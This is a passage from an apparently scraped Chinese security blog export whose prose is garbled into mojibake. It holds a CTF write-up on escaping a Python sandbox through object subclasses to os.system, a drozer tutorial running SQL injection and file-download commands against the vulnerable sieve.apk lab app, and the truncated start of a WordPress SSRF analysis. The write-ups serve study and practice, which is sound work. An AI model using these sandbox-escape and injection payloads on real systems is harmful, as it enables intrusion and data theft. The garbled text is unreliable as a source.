escape","permalink":"http://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/","text":"æ¦‚è¿°å‰å‡ å¤©çš„åå±±æ¯å‡ºäº†ä¸€é“pythonçš„æ²™ç›’é€ƒé€¸ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ã€‚åœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°å¾ˆæ—©å°±å‡ºè¿‡è¿™ç§ç±»å‹çš„é¢˜ï¼Œæºç éƒ½å·®ä¸å¤šã€‚å­¦ä¹ äº†ä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼šï¼‰ ä»‹ç»æ²™ç›’æºç å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom __future__ import print_functionprint(\"Welcome to my Python sandbox! Enter commands below!\")banned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys() targets.remove('raw_input') targets.remove('print') for x in targets:# å»é™¤æ‰€æœ‰å†…ç½®å‡½æ•°é™¤print raw_input del __builtins__.__dict__[x]while 1: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"No bueno\") break else: # this means nobreak exec data ä¸èƒ½å‡ºç°bannedåˆ—è¡¨ä¸­çš„å­—ç¬¦ï¼Œä½†æ˜¯éœ€è¦è¯»å–flagæ–‡ä»¶å†…å®¹ã€‚ åŸç†ç»•è¿‡å‰é¢çš„é™åˆ¶ï¼Œæˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥çœ‹payload æ–¹æ³•ä¸€123456&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &apos;dict&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; é¦–å…ˆpythonçš„å†…ç½®å¯¹è±¡æœ‰ä¸€ä¸ªclasså±æ€§æ¥å­˜å‚¨ç±»å‹ï¼Œæˆ‘ä»¬å¾€ä¸Šæ‰¾ä»–çš„çˆ¶ç±»ä½¿ç”¨baseå±æ€§123456&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt; å¯ä»¥çœ‹åˆ°è¿”å›objectå¯¹è±¡ï¼Œå› ä¸ºpythonä¸­ä¸€åˆ‡å‡ä¸ºå¯¹è±¡ï¼Œå‡ç»§æ‰¿objectå¯¹è±¡ï¼Œå¾—åˆ°objectä¹‹åæˆ‘ä»¬å°±å¯åœ¨é€šè¿‡å±æ€§subclassesæ¥æŸ¥çœ‹objectçš„å­ç±»ï¼ˆåŒ…æ‹¬æ‰€æœ‰çš„å†…ç½®ç±»ï¼‰12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;] å›åˆ°æˆ‘ä»¬çš„ä¸»è¦ç›®çš„ä¸Šï¼Œæˆ‘ä»¬éœ€è¦è¯»å–flagæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œåœ¨è¿™äº›å­ç±»ä¸­æœ‰å“ªäº›æ˜¯å¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯fileå­ç±»ï¼Œé¦–å…ˆæŸ¥æ‰¾ä¸€ä¸‹fileå­ç±»çš„ä½ç½®ã€‚12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)40 è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å»ºç«‹ä¸€ä¸ªfileç±»çš„åˆ«åè¯»æ–‡ä»¶å•¦ï¼šï¼‰12&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read() ï¼Ÿï¼Ÿï¼Ÿæ²¡æœ‰ä»»ä½•å†…å®¹æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯ä»–æ²¡æœ‰æŠ¥é”™è¯´æ˜å­˜åœ¨flag.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç”¨ä»–ç»™çš„printå‡½æ•°æ¥æ‰“å°12&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())This is a Flag&#123;enjoy_yourself_ctfer&#125; å¾—åˆ°flag æ–¹æ³•äºŒåŒæ ·çš„è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯ä½¿ç”¨osæ¨¡å—æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤systemï¼Œä½†æ˜¯osè¢«å±è”½12&gt;&gt;&gt; import osNo bueno æˆ‘ä»¬å¾—æƒ³å…¶ä»–åŠæ³•æ¥è·å–shellã€‚é€šè¿‡ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå­ç±»ä»–èƒ½è°ƒç”¨osæ¨¡å—ï¼Œè¿™é‡Œç”¨åˆ°äº†warnings.catch_warningsç±»1234567&gt;&gt;&gt; import warnings&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]&lt;class &apos;warnings.catch_warnings&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;] æ¥ä¸‹æ¥å†æ‰¾linecache1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)25&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;] å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥è°ƒç”¨osæ¨¡å—ï¼Œæ¥ä¸‹æ¥å°±è°ƒç”¨systemå‡½æ•°äº†1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)144 æ•´ç†ä¸€ä¸‹123456789101112&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&gt;&gt;&gt; a&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)&gt;&gt;&gt; s144&gt;&gt;&gt; s=a.__dict__.keys()[144]&gt;&gt;&gt; s&apos;system&apos;&gt;&gt;&gt; s=a.__dict__.values()[144]&gt;&gt;&gt; s(&apos;pwd&apos;)/home/xxxx/Desktop/code/python-code/test å¥½äº†ç°åœ¨å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œcatä¸€ä¸‹flag12&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)This is a Flag&#123;enjoy_yourself_ctfer&#125; æ€»ç»“é€šè¿‡ä¸Šé¢çš„pythonæ²™ç›’é€ƒé€¸ï¼Œå‘ç°è¯»pythonå®˜ç½‘æ‰‹å†Œè¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œæ‰¾ä¸ªæ—¶é—´ä¸€ç‚¹ä¸€ç‚¹çœ‹ï¼šï¼‰å…±å‹‰ å‚è€ƒhttps://hexplo.it/escaping-the-csawctf-python-sandbox/"},{"title":"ã€MOBILEã€‘how to install drozer on mac","permalink":"http://blog.0kami.cn/2016/08/20/old-how-to-install-drozer-on-mac/","text":"ä¸€ï¼šæ¦‚è¿°drozeræ˜¯ä¸€æ¬¾é’ˆå¯¹Androidç³»ç»Ÿçš„å®‰å…¨æµ‹è¯•æ¡†æ¶ã€‚drozerå¯ä»¥å¸®åŠ©Android appå’Œè®¾å¤‡å˜å¾—æ›´å®‰å…¨ï¼Œå…¶æä¾›äº†å¾ˆå¤šAndroidå¹³å°ä¸‹çš„æ¸—é€æµ‹è¯•exploitä¾›ä½ ä½¿ç”¨å’Œåˆ†äº«ã€‚å¯¹äºè¿œç¨‹çš„exploitï¼Œå®ƒå¯ä»¥ç”Ÿæˆshellcodeå¸®åŠ©ä½ è¿›è¡Œè¿œç¨‹è®¾å¤‡ç®¡ç†ã€‚ æ›´å¿«çš„Androidå®‰å…¨è¯„ä¼°drozerå¯ä»¥å¤§å¤§ç¼©å‡Androidå®‰å…¨è¯„ä¼°çš„è€—æ—¶ï¼Œé€šè¿‡æ”»å‡»æµ‹è¯•æš´éœ²Android APPçš„æ¼æ´ã€‚ åŸºäºçœŸæœºçš„æµ‹è¯•drozerè¿è¡Œåœ¨Androidæ¨¡æ‹Ÿå™¨å’ŒçœŸå®è®¾å¤‡ä¸Šï¼Œå®ƒåªéœ€è¦USBè°ƒè¯•å³å¯ä½¿ç”¨ã€‚ è‡ªåŠ¨åŒ–å’Œæ‰©å±•drozeræœ‰å¾ˆå¤šæ‰©å±•æ¨¡å—ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä»–ä»¬è¿›è¡Œæµ‹è¯•ä»¥å‘ç°Androidå®‰å…¨é—®é¢˜ã€‚ äºŒï¼šå®‰è£…drozerä¸‹è½½é“¾æ¥ï¼šhttps://github.com/mwrlabs/drozer windowå’ŒLinuxä¸‹çš„å®‰è£…è¦ç®€å•çš„å¤šï¼Œä½†æ˜¯åœ¨macä¸Šå®‰è£…æ—¶é‡åˆ°äº†ä¸€äº›é”™è¯¯ï¼Œå› æ­¤å°†è‡ªå·±çš„å®‰è£…æ­¥éª¤è®°å½•ä¸‹æ¥ã€‚ å› ä¸ºæ˜¯ç”¨pythonå†™çš„ï¼Œæ‰€ä»¥Macå¯ä»¥ä¸‹è½½python.eggæ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚ä½†æ˜¯æƒ³é€šè¿‡easy_installå®‰è£…ï¼Œå¿…é¡»æ‹¥æœ‰ä»¥ä¸‹è¿™äº›æ¨¡å—ï¼š 123456789101112cffi==1.1.2cryptography==0.9.3drozer==2.3.4enum34==1.0.4idna==2.0ipaddress==1.0.14protobuf==2.4.1pyasn1==0.1.8pycparser==2.14pyOpenSSL==0.13six==1.9.0Twisted==10.2.0 è€Œå®‰è£…è¿‡ç¨‹ä¸­ä¸»è¦çš„é”™è¯¯æ˜¯ç”±pyOpenSSLé€ æˆçš„ã€‚ 1.1 å®‰è£…openssl12$ brew uninstall openssl #if installed already$ brew install openssl 1.2 ç¼–è¯‘pyOpenSSLä¸å¹¸çš„æ˜¯åœ¨åé¢å®‰è£…Python.eggè¿˜æ˜¯ä¼šæŠ¥é”™,åŸå› æ˜¯Drozeréœ€è¦ç‰¹æ®Šç‰ˆæœ¬çš„opensslï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½ pyOpenSSL v0.13ï¼Œç„¶åç”¨sedæŒ‡ä»¤ä¿®å¤typoï¼Œå…·ä½“æŒ‡ä»¤ï¼š1234$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz$ tar xzvf pyOpenSSL-0.13.tar.gz$ cd pyOpenSSL-0.13$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c æ¥ä¸‹æ¥æˆ‘ä»¬build OpenSSLï¼Œè¿™é‡Œéœ€è¦æŒ‡æ˜æœ¬æœºä¸­OpenSSL headersæ–‡ä»¶çš„ä½ç½®ï¼š123$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include$ python setup.py build$ python setup.py install 1.3 å®‰è£…å…¶ä»–æ”¯æ’‘æ–‡ä»¶ç»ˆäºè¿›å…¥å®‰è£…è¯´æ˜æ–‡æ¡£ä¸­çš„æ­¥éª¤äº†12$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works 1.4 å®‰è£…drozeræœ€åä¸€æ­¥ï¼Œinstall drozer1$ sudo easy_install ./drozer-2.3.4-py2.7.egg 1.5 runnningæ­¤æ—¶å¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸‹ä½¿ç”¨drozer å‘½ä»¤å•¦ï¼ ä¸‰ï¼šDrozerå…¥é—¨â€” è·å–App Packageä¿¡æ¯æ­¤å¤„ä»¥sieve.apkä¸ºä¾‹ drozeræ¯ä¸ªæ¨¡å—çš„ä½œç”¨ï¼š è·å–AppåŒ…ä¿¡æ¯çš„æ¨¡å—æ˜¯ ** app.package.* : 2.1 è·å–è·å–Androidè®¾å¤‡ä¸Šçš„æ‰€æœ‰çš„å®‰è£…çš„Appçš„åŒ…åå‘½ä»¤æ˜¯ï¼š1run app.package.info -a com.mwr.example.sieve run app.package.list è¿™æ¡å‘½ä»¤ä¼šæŠŠæ‰€æœ‰çš„Appéƒ½åˆ—å‡ºæ¥ï¼Œå¦‚æœæƒ³å…·ä½“æŸ¥æ‰¾æŸä¸ªAppå¯åŠ ä¸Š-f [Appå…³é”®å­—]çš„å‚æ•°ï¼Œå¦‚æŸ¥æ‰¾sieveåœ¨Androidè®¾å¤‡ä¸­çš„åŒ…åï¼š1run app.package.list -f sieve 2.2 è·å–Sieveçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯1run app.package.info -a com.mwr.example.sieve 2.3 Itentify The Attack Surface(ç¡®å®šæ”»å‡»é¢)è¿™ä¸ªæµ‹è¯•æ•™ç¨‹ä¸»è¦å…³æ³¨çš„æ˜¯Android å›ºæœ‰çš„IPCé€šä¿¡æœºåˆ¶çš„è„†å¼±æ€§ï¼Œè¿™äº›ç‰¹ç‚¹å¯¼è‡´äº†Appæ³„æ¼æ•æ„Ÿä¿¡æ¯ç»™åŒä¸€å°è®¾å¤‡ä¸Šçš„å…¶å®ƒAppã€‚ æŸ¥æ‰¾å¯ä»¥è¿›è¡ŒAttack Surfaceçš„ç»„ä»¶çš„å‘½ä»¤ï¼š1run app.package.attacksurface com.mwr.example.sieve ç»“æœæ˜¾ç¤ºäº†æ½œåœ¨å¯ä»¥åˆ©ç”¨çš„ç»„ä»¶ä¸ªæ•°ï¼š â€œexportedâ€è¡¨ç¤ºç»„ä»¶å¯ä»¥è¢«å…¶ä»–Appä½¿ç”¨ã€‚ services is debuggableè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥ç”¨adbç»‘å®šä¸€ä¸ªè°ƒè¯•å™¨åˆ°è¿›ç¨‹ã€‚ 2.4 è¿›ä¸€æ­¥è·å–Attack Surfaceçš„ä¿¡æ¯å¦‚è¿›ä¸€æ­¥è·å–ativityç»„å»ºçš„attack surfaceä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š1run app.activity.info -a com.mwr.example.sieve 2.5 å¯åŠ¨Activitiesä¸Šå›¾çš„PWListå’ŒFileSelectActivityæ˜¯exportedå¹¶ä¸”ä¸éœ€è¦ä»»ä½•æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨drozerå¯åŠ¨ä»–ä»¬ï¼Œæ¯”å¦‚æ„Ÿè§‰PWListè¿™ä¸ªå«é‡‘é‡åº”è¯¥å¤§ä¸€ç‚¹ï¼Œæ‰€ä»¥å°±å¯åŠ¨å®ƒäº†ï¼Œå‘½ä»¤æ˜¯ï¼š1run app.activity.start â€“component com.mwr.example.sieve com.mwr.example.sieve.PWList 2.6 ä»Content Providerä¸­è·å–ä¿¡æ¯æ¥ä¸Š2.3èŠ‚ï¼Œè¿›ä¸€æ­¥è·å–content providerçš„attact surfaceçš„ä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š1run app.provider.info -a com.mwr.example.sieve ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°2.3èŠ‚ä¸­ä¸¤ä¸ªexportedçš„content providerçš„å…·ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬åå­—ï¼Œæƒé™ï¼Œè®¿é—®è·¯å¾„ç­‰ã€‚ 2.6.1 æŸ¥æ‰¾å¯ä»¥è®¿é—®Content Providerçš„URIï¼ˆæ•°æ®æ³„æ¼ï¼‰ä»ä¸ŠèŠ‚å›¾ä¸­æˆ‘ä»¬çŒœæµ‹DBContentProviderä¼šæœ‰æŸç§æ ¼å¼çš„æ•°æ®åº“ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…¶ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•ç»„ç»‡çš„ã€‚Content URIå¿…é¡»æ˜¯ â€œcontent:///â€ çš„å½¢å¼,å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ éƒ¨åˆ†çš„content URIsæ¥è®¿é—®DBcontent Providerã€‚ ä¸Šå›¾å­˜åœ¨ä¸€ä¸ªéœ€è¦READ_KEYSå’ŒWRITE_KEYSæƒé™æ‰èƒ½è¯»å’Œå†™çš„â€œ/Keysâ€çš„è·¯å¾„ã€‚drozerçš„scanneræ¨¡å—æä¾›äº†ä¸€äº›æ–¹æ³•å»çŒœæµ‹å¯èƒ½å­˜åœ¨çš„content URIsï¼š1run scanner.provider.finduris -a com.mwr.example.sieve ä¸Šå›¾ä¸­æ£€æµ‹å‡ºäº†å¯ä»¥è®¿é—®contentçš„URIï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç”¨drozerçš„å…¶ä»–æ¨¡å—å’ŒURIä»contentä¸­è·å–ï¼Œç”šè‡³æ›´æ”¹ä¿¡æ¯ã€‚ å¦‚ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“vertical å¦‚ä¸Šå›¾æˆ‘ä»¬è·å–äº†ç”¨æˆ·åï¼Œé‚®ç®±å¸å·ï¼Œå’ŒBase64ç¼–ç çš„å¯†ç å­—ç¬¦ä¸²ã€‚ 2.6.2 è¿›è¡ŒSQLæ³¨å…¥Androidæ“ä½œç³»ç»Ÿå»ºè®®ä½¿ç”¨SQLiteæ•°æ®åº“å­˜å‚¨ç”¨æˆ·æ•°æ®ã€‚SQLiteæ•°æ®åº“ä½¿ç”¨SQLè¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ã€‚ ä½¿ç”¨projectionå‚æ•°å’Œselecitonå‚æ•°å¯ä»¥ä¼ é€’ä¸€äº›ç®€å•çš„SQLæ³¨å…¥è¯­å¥åˆ°Content providerã€‚å¦‚ï¼š123run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œâ€˜â€run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“selection â€œâ€˜â€ ä¸Šé¢ä¸¤æ¡å‘½ä»¤æ‰§è¡ŒåAndroidè®¾å¤‡è¿”å›äº†éå¸¸è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ã€‚ä½¿ç”¨Sqlæ³¨å…¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®è¡¨ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM SQLITE_MASTER WHERE type=â€™tableâ€™;â€“â€œ ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ 2.6.3 ä»File System-Backed Content Providersè·å–ä¿¡æ¯File System-backed Content Provideræä¾›äº†è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿçš„æ–¹æ³•ï¼ŒAndroidæ²™ç›’ä¼šé˜»æ­¢Appå…±äº«æ–‡ä»¶å…è®¸ï¼Œè€ŒFile System-backed Content Providerå…è®¸Appå…±äº«æ–‡ä»¶ã€‚ å¯¹äºsieveæ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºçš„FileBackupProviderå°±æ˜¯ä¸€ä¸ªfile system-backed content providerã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨drozerçš„app.provider.readæ¨¡å—æŸ¥çœ‹æŸä¸ªæ–‡ä»¶ï¼š1run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts å¯ä»¥ä½¿ç”¨app.provider.downloadä¸‹è½½æ–‡ä»¶1run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db 2.6.4 æ£€æŸ¥Content Providerçš„è„†å¼±æ€§æ£€æŸ¥æ˜¯å¦æœ‰SQLæ³¨å…¥ï¼š1run scanner.provider.injection -a com.mwr.example.sieve æ£€æŸ¥æ˜¯å¦å­˜åœ¨éå†æ–‡ä»¶çš„æ¼æ´1run scanner.provider.traversal -a com.mwr.example.sieve æ€»ç»“ä½“ä¼šï¼šæˆ‘è§‰å¾—åœ¨åˆšå¼€å§‹è·å–äº†è½¯ä»¶åŒ…çš„åŸºæœ¬ä¿¡æ¯åï¼Œå°±å…ˆç”¨æ¨¡å—scanneré‡Œé¢çš„å·¥å…·æ‰«ä¸€æ‰«ï¼Œæ‰¾åˆ°ä¸€äº›æ¼æ´æˆ–è€…åˆ©ç”¨ç‚¹åå†è¿›è¡Œä¸‹ä¸€æ­¥ã€‚ 2.7 å’ŒServicesäº¤äº’è·å–æ˜¯exportedçŠ¶æ€çš„servicesçš„å‘½ä»¤ï¼š1run app.service.info -a com.mwr.example.sieve å…³äºServicesçš„æ¨¡å—ï¼šå¦‚å‘æŸä¸ªæœåŠ¡å‘é€ä¿¡æ¯ï¼š1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService â€“msg 1 5 3 2.8 å…¶ä»–å¸¸ç”¨æ¨¡å— shell.start åœ¨Androidè®¾å¤‡ä¸Šå¼€å¯ä¸€ä¸ªäº¤äº’å¼Linux Shell tools.file.upload / tools.file.downloa tools.setup.busybox / tools.setup.minimalsu å®‰ è£…busyboxæˆ–è€…minimalsuåˆ°Androidè®¾å¤‡ä¸Š å‚è€ƒé“¾æ¥ï¼šhttps://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"},{"title":"ã€Code Analysisã€‘wordpress SSRF <4.5","permalink":"http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/","text":"æ¦‚è¿°å‰å‡ å¤©ï¼Œwordpressçˆ†å‡ºä¸€ä¸ªSSRFçš„æ¼æ´ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹ï¼Œç½‘ä¸Šå¹¶æ²¡æœ‰è¯¦ç»†çš„åˆ©ç”¨æ–¹å¼ã€‚ä»¥å‰ä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦è¿‡wordpressï¼Œçœ‹äº†ä¸€ä¸‹å—å½±å“çš„ä»£ç ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚ ipåœ°å€çš„å‡ ç§è¡¨ç¤ºæ–¹å¼ipåœ°å€åŸŸåæœ‰å¤šç§è¡¨ç¤ºæ–¹å¼ï¼Œæµè§ˆå™¨éƒ½èƒ½è¯†åˆ«å‡ºæ¥ã€‚ å¸¸è§çš„ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³• ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•ï¼Œä¾‹å¦‚192.168.1.2 äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ä¾‹å¦‚11000000101010000000000100000010ï¼Œè¡¨ç¤º192.168.1.2 éå¸¸è§ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³• æ•´æ•°å‹ï¼šå°†ä¸Šè¿°çš„äºŒè¿›åˆ¶ç›´æ¥è½¬æ¢æˆæ•´æ•°3232235778ï¼Œæµè§ˆå™¨é€šè¿‡è®¿é—®http://3232235778 è§£æä¸º192.168.1.2ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥é€šè¿‡å…¬å¼192*256^3+168*256^2+1*256+2=3232235778æ¢ç®— å…«è¿›åˆ¶å‹ï¼šå°†IP 